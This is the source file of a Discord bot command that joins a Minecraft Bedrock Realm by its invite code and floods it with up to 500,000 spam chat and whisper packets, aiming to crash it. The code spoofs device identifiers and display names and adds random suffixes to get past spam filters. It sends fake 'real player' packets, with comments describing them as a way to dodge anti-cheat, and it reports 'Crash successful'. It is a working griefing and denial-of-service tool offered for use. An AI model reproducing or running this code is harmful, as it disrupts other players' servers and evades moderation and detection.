const { SlashCommandBuilder, EmbedBuilder } = require("discord.js");
const config = require('../../data/discord/config.json');
const fs = require('node:fs');
const colors = require('../../data/handles/colors.js');
const path = require('path');
const { createClient } = require('bedrock-protocol');
const { dumprealm,checkaccount,getrealminfo } = require('../../men/realms');
const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
const { Authflow, Titles } = require("prismarine-auth");
const skinData = require('../../data/client/jenny.json')

module.exports = {
    data: new SlashCommandBuilder()
        .setName("spam")
        .setIntegrationTypes(0, 1)
        .setContexts(0, 1, 2)
        .setDescription("Spam the Realm with Silly Messages")
        .addIntegerOption(option =>
            option.setName('account')
                .setDescription('Account you wanna use')
                .setRequired(true)
                .addChoices(
                    { name: 'Account 1', value: 1 },
                    { name: 'Account 2', value: 2 },
                    { name: 'Account 3', value: 3 }))
        .addStringOption(option =>
            option.setName('invite')
                .setDescription('Realm invite code')
                .setRequired(true)
                .setMinLength(8)
                .setMaxLength(15))
        .addBooleanOption(option => 
            option.setName('external')
                .setDescription('Send messages as External ?')
                .setRequired(true))
        .addIntegerOption(option =>
             option.setName('spamtype')
                .setDescription('Type of spam command')
                .setRequired(true)
                .addChoices(
                    { name: 'Chat', value: 1 },
                    { name: 'Wisper 1', value: 2 },
                    { name: 'Wisper 2', value: 4 }))
        .addStringOption(option =>
            option.setName('message')
            .setDescription('Custom message to spam')
            .setRequired(true))
            .addIntegerOption(option =>
                option.setName('packets')
                    .setDescription('Number of packets to send')
                    .setRequired(true)
                    .addChoices(
                        { name: '5K', value: 5000 },
                        { name: '10K', value: 10000 },
                        { name: '50K', value: 50000 },
                        { name: '100K', value: 100000 },
                        { name: '300K', value: 300000 },
                        { name: '500K/(Crash)', value: 500000 },))
         .addBooleanOption(option =>
                option.setName('rainbow')
                        .setDescription('Rainbow text option')
                        .setRequired(false))
        .addBooleanOption(option =>
                option.setName('bypass')
                        .setDescription('Generates a randome string behind every message')
                        .setRequired(false))
        .addStringOption(option =>
                option.setName('message2')
                        .setDescription('Second message to spam')
                        .setRequired(false))
        .addStringOption(option =>
                option.setName('namespoof_name')
                        .setDescription('Name Spoof Name')
                        .setRequired(false)),
    async execute(interaction) {
        
        const invite = interaction.options.getString('invite');
        let disconnected = false;
        const external = interaction.options.getBoolean('external');
        const message1 = interaction.options.getString('message');
        const packetCount = interaction.options.getInteger('packets');
        const spamType = interaction.options.getInteger('spamtype');
        const rainbow = interaction.options.getBoolean('rainbow') || false;
        const bypass = interaction.options.getBoolean('bypass') || false;
        const namespoof = interaction.options.getString('namespoof_name') || " "
        const customMessage2 = interaction.options.getString('message2') || "§3 discord.gg/frosted §4 on TOP";
        const rainbowLink = rainbowText(config.link);
        const account = interaction.options.getInteger('account')
        const requestType = external ? 5 : 0;
        try {
            await interaction.reply({
                embeds: [
                    new EmbedBuilder()
                        .setTitle("Frosted Spam (r)")
                        .setDescription(`Loading data, this may take a few seconds depending on the workload.`)
                        .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                        .setThumbnail(config.embeds.footerurl)
                        .setColor(config.embeds.color)
                ],ephemeral: true,
            });

            if (!fs.existsSync(`./data/client/frosted/${interaction.user.id}/profile${account}`)) {
                await interaction.editReply({
                    embeds: [
                        {
                            title: `X Account Not Linked X`,
                            description: `It seems like you haven't linked an account yet.\nPlease link an account whit `+'`/link `' + `to use this command.`,
                            color: 0xff0000,
                            footer: { text: "e" },
                        },
                    ],
                });
                return;
            }

            const whitelist = JSON.parse(fs.readFileSync('./data/client/whitelist.json', 'utf8'));
            if (whitelist.includes(invite)) {
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`The invite \`${invite}\` is in the whitelist and cannot be nuked.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }

            const realm = await getrealminfo(invite);
            if (!realm) {
                console.error(`[${new Date().toLocaleTimeString()}] Error: Realm not found`);
                return interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`Invalid code: realm not found or account banned.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            }

            if (!fs.existsSync(`./data/client/frosted/${interaction.user.id}/profile${account}`)) {
                await interaction.editReply({
                    embeds: [
                        {
                            title: `X Account Not Linked X`,
                            description: `It seems like you haven't linked an account yet.\nPlease link an account whit `+'`/link `' + `to use this command.`,
                            color: 0xff0000,
                            footer: { text: "e" },
                        },
                    ],
                });
                return;
            }

            const crypto = require("node:crypto");
            const curve = "secp384r1";
            const keypair = crypto.generateKeyPairSync("ec", { namedCurve: curve }).toString("base64");
            const bot = new Authflow(
                interaction.user.id, 
                path.resolve(`./data/client/frosted/${interaction.user.id}/profile${account}`), 
                {
                    flow: 'live',
                    authTitle: 'MinecraftNintendoSwitch',
                    deviceType: 'Nintendo',
                    doSisuAuth: true
                }
            );
            
            async function refreshOrRetrieveTokens() {
                try {
                    const xboxToken = await bot.getXboxToken();
                    await bot.getMinecraftBedrockToken(keypair);
                    console.log('Susesfull Refreshed Token:', xboxToken);
                    return xboxToken;
                } catch (error) {
                    console.error('Error while Refrshing', error);
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle("Token Refresh Error")
                                .setDescription(`We could not refresh your Token. Try to Relink or Link a new Account`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });
                }
            }
            
            (async () => {
                console.log('Refreshing Token...');
                
                const token = await refreshOrRetrieveTokens();
                if (token) {
                    console.log('Susessfull Refreshd Token');
                    
                } else {
                    console.log('Error Refreshing Token');
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle("Token Refresh Error")
                                .setDescription(`We could not refresh your Token. Try to Relink or Link a new Account`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });
                    return;
                }
            })();
            const client = createClient({
                profilesFolder: `./data/client/frosted/${interaction.user.id}/profile${account}`,
                username: interaction.user.id,
                offline: false,
                realms: {
                    ...(invite.length === 8
                        ? { realmId: invite }
                        : { realmInvite: invite })
                },
                skinData: {
                    DeviceOS: 12,
                    DeviceId: uuidv3(uuidv4(), NIL),
                    PlatformOnlineId: genrandomstring(19, '1234567890'),
                    PrimaryUser: false,
                    SelfSignedId: uuidv4(),
                    ThirdPartyName: namespoof,
                    ThirdPartyNameOnly: true,
                    TrustedSkin: true,
                    ...skinData // costume skin for less detaction
                },
                skipPing: true
            });

            client.on('error', async (err) => {
                if (disconnected) return;
                disconnected = true;
                console.error(`[${new Date().toLocaleTimeString()}] Client error: ${err.message || err}`);
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`Error occurred: ${err.message || 'Unknown error'}`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
                client.disconnect();
            });
             
            let runtimeEntityId;

            client.on('start_game', (packet) => { // Small littel Hack to make Bot less Detactebel
              runtimeEntityId = packet.runtime_entity_id
              console.log(`Runtime Entity ID: ${runtimeEntityId}`);
            });
            client.on('start_game', (packet) => {
            client.queue('serverbound_loading_screen', { // sends the "is loading in Packet"
              "type": 1
            })
            client.queue('serverbound_loading_screen', { // Removes the immortal status of the Bot
              "type": 2
            })
            client.queue('interact', {  // Verify the Movement so Server sees us as a Real Player !
              "action_id": "mouse_over_entity",
              "target_entity_id": 0n,
              "position": {
                "x": 0,
                "y": 0,
                "z": 0
              }
            })
            client.queue('set_local_player_as_initialized', { // almost same as the first but mc is goofy and needs more packets, do i know ? nope !
              "runtime_entity_id": `${runtimeEntityId}`
            })
            client.queue("animate", {//  like a spoof to anti cheats :p
                action_id: 1, // making your arm swing 
                runtime_entity_id: packet.runtime_entity_id});
            })
            client.on('play_status', async () => {
                console.log(`${colors.green}[Realm Watcher]${colors.cyan}>> User ${interaction.user.username}/${interaction.user.id} join Realm ${realm.name}/${invite}`)
                try {
                    await interaction.editReply({
                        embeds: [
                            new EmbedBuilder()
                                .setTitle('Frosted Crash (r)')
                                .setDescription(`Joined and started to crash ${realm.name} - ${invite}. Disconnecting in 10 seconds...`)
                                .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                .setThumbnail(config.embeds.footerurl)
                                .setColor(config.embeds.color)
                        ]
                    });

                    setTimeout(() => {
                        if (disconnected) return;
                        for (let i = 0; i < packetCount; i++) {
                            let message = message1 + (bypass ? ` ${genrandomstring(8)}` : '');
                            let command;
                            let messageCount = 0
                            if (rainbow) {
                                switch (spamType) {
                                    case 1:
                                        command = `/me ${colorizeText(message, true)} ${rainbowLink}`;
                                        break;
                                    case 2:
                                        command = `/tell @a ${colorizeText(message, true)} ${rainbowLink}`;
                                        break;
                                    case 4:
                                        command = `/msg @a ${colorizeText(message, true)} ${rainbowLink}`;
                                        break;
                                    default:
                                        console.error('Invalid spam type');
                                }
                            } else {
                                switch (spamType) {
                                    case 1:
                                        command = `/me ${message}`;
                                        break;
                                    case 2:
                                        command = `/tell @a ${message}`;
                                        break;
                                    case 4:
                                        command = `/msg @a ${message}`;
                                        break;
                                    default:
                                        console.error('Invalid spam type');
                                }
                            }
                            if (spamType !== 3 && command) {
                                client.queue('command_request', {
                                    command: command,
                                    internal: false,
                                    version: 66,
                                    origin: {
                                        type: requestType,
                                        uuid: uuidv4(),
                                        request_id: "TSL Nuker"
                                    }
                                });
                            }
                            messageCount += 1;
        
                            let message2 = customMessage2 + (bypass ? ` ${genrandomstring(8)}` : '');
                            let command2;
                            if (rainbow) {
                                switch (spamType) {
                                    case 1:
                                        command2 = `/me ${colorizeText(message2, true)}`;
                                        break;
                                    case 2:
                                        command2 = `/tell @a ${colorizeText(message2, true)}`;
                                        break;
                                    case 4:
                                        command2 = `/msg @a ${colorizeText(message2, true)}`;
                                        break;
                                    default:
                                        console.error('Invalid spam type');
                                }
                            } else {
                                switch (spamType) {
                                    case 1:
                                        command2 = `/me ${message2}`;
                                        break;
                                    case 2:
                                        command2 = `/tell @a ${message2}`;
                                        break;
                                    case 4:
                                        command2 = `/msg @a ${message2}`;
                                        break;
                                    default:
                                        console.error('Invalid spam type');
                                }
                            }
                            if (spamType !== 3 && command2) {
                                client.queue('command_request', {
                                    command: command2,
                                    internal: false,
                                    version: 66,
                                    origin: {
                                        type: requestType,
                                        uuid: uuidv4(),
                                        request_id: "TSL Nuker"
                                    }
                                });
                            }
                            messageCount += 1;
                        }
                    }, 0);

                    setTimeout(() => {
                        if (!disconnected) {
                            client.close();
                            interaction.editReply({
                                embeds: [
                                    new EmbedBuilder()
                                        .setTitle('Frosted Crash (r)')
                                        .setDescription(`Client disconnected from ${realm.name}. Crash successful.`)
                                        .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                                        .setThumbnail(config.embeds.footerurl)
                                        .setColor(config.embeds.color)
                                ]
                            });
                            disconnected = true;
                        }
                    }, 10000);
                } catch (error) {
                    console.error(error);
                    throw error;
                }
            });

            client.on('close', async (err) => {
                if (disconnected) return;
                disconnected = true;
                console.error(`[${new Date().toLocaleTimeString()}] Client closed: ${err}`);
                await interaction.editReply({
                    embeds: [
                        new EmbedBuilder()
                            .setTitle('Frosted Error')
                            .setDescription(`Connection closed. Crash completed.`)
                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
                            .setThumbnail(config.embeds.footerurl)
                            .setColor(config.embeds.color)
                    ]
                });
            });
        } catch (err) {
            console.error(err);
        }
    }
};

function genrandomstring(length, charSet) {
    if (!charSet) charSet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_-';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += charSet.charAt(Math.floor(Math.random() * charSet.length));
    }
    return result;
}

function colorizeText(text) {
    const words = text.split(' ');
    const coloredWords = words.map(word => {
        const colorCode = randomCode();
        return `${colorCode}${word}`;
    });
    return coloredWords.join(' ');
}

function rainbowText(text) {
    const colors = ['§c', '§6', '§e', '§a', '§b', '§9', '§d', '§f'];
    let rainbowedText = '';
    
    for (let i = 0; i < text.length; i++) {
        rainbowedText += colors[i % colors.length] + text[i];
    }
    return rainbowedText;
}

function randomCode() {
    const optionsString = "1234567890";
    const optionsArray = optionsString.split('');
    const randomIndex = Math.floor(Math.random() * optionsArray.length);
    const randomOption = optionsArray[randomIndex];
    return "§" + randomOption;
}
